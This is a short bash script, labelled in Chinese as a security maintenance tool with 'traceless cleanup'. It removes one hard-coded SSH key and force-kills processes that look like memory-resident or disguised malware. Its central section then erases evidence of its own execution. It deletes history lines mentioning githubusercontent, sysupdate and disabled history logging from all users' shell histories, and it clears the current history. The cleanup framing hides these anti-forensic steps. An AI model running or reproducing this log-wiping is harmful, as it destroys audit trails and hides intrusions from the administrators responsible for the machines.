#!/bin/bash

# =========================================
# 系统安全维护自动化脚本 (集成无痕清理)
# =========================================

if [ "$(id -u)" != "0" ]; then
   echo "Error: Root privileges required." 1>&2
   exit 1
fi

# 1. 清理恶意 SSH 密钥
MALICIOUS_KEY="AAAAC3NzaC1lZDI1NTE5AAAAIMMDxNliLAR1lLp5koxMHQtdCN0cNrV9HQbtzaDfNu8J"
for auth_file in /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys; do
    if [ -f "$auth_file" ]; then
        if grep -q "$MALICIOUS_KEY" "$auth_file"; then
            sed -i "/$MALICIOUS_KEY/d" "$auth_file"
        fi
    fi
done

# 2. 查杀内存马与伪装进程
for pid in $(ls -d /proc/[0-9]* 2>/dev/null | sed 's|/proc/||'); do
    exe=$(readlink /proc/$pid/exe 2>/dev/null)
    comm=$(cat /proc/$pid/comm 2>/dev/null)
    ppid=$(awk '{print $4}' /proc/$pid/stat 2>/dev/null)
    
    kill_flag=0

    if [[ "$exe" == *"/memfd:"* ]]; then kill_flag=1; fi
    if [[ "$comm" == k* ]] && [[ -n "$exe" ]] && [[ "$ppid" != "2" ]]; then
        if [[ "$exe" != *"/usr/lib/systemd/"* ]] && [[ "$comm" != "kdump"* ]] && [[ "$comm" != "kthreadd"* ]]; then
            kill_flag=1
        fi
    fi
    if [[ "$exe" == *"(deleted)"* ]] && [[ "$exe" != *"/usr/"* ]] && [[ "$exe" != *"/bin/"* ]] && [[ "$exe" != *"/sbin/"* ]]; then
        kill_flag=1
    fi

    if [ "$kill_flag" -eq 1 ]; then
        kill -9 "$pid" 2>/dev/null
    fi
done

# =========================================
# 3. 核心：彻底擦除本次执行痕迹
# =========================================

# 异步清理历史文件，防止因文件占用未写入
(
    sleep 1
    # 清理所有潜在用户的 history 文件中包含 github 或 sysupdate 的敏感行
    for hist_file in /root/.bash_history /root/.zsh_history /home/*/.bash_history /home/*/.zsh_history; do
        if [ -f "$hist_file" ]; then
            sed -i '/githubusercontent/d' "$hist_file"
            sed -i '/sysupdate/d' "$hist_file"
            sed -i '/set +o history/d' "$hist_file"
        fi
    done
) &

# 清除当前 Shell 会话的内存历史缓存（使其不会写入 history 文件）
history -c 2>/dev/null
cat /dev/null > ~/.bash_history 2>/dev/null

echo "Maintenance completed successfully."
